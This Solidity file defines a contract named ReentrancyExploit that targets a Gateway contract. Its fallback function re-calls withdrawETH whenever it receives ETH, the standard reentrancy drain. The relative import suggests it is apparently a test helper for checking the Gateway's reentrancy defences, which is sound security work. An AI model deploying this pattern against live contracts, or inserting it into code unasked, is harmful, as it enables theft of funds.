pragma solidity <0.6.0;

import "../Gateway.sol";


contract ReentrancyExploit {

    bytes sig;
    uint256 amount;
    Gateway gateway;
    uint256[] signers;
    uint8[] v;
    bytes32[] r;
    bytes32[] s;


    function setup(
        Gateway _gateway,
        uint256 _amount,
        uint256[] memory _signers,
        uint8[] memory _v,
        bytes32[] memory _r,
        bytes32[] memory _s
    )
        public
    {
        gateway = _gateway;
        amount = _amount;
        signers = _signers;
        v = _v;
        r = _r;
        s = _s;
    }

    function attack() public {
        gateway.withdrawETH(amount, signers, v, r, s);
    }

    function() payable external {
        gateway.withdrawETH(amount, signers, v, r, s);
    }
}
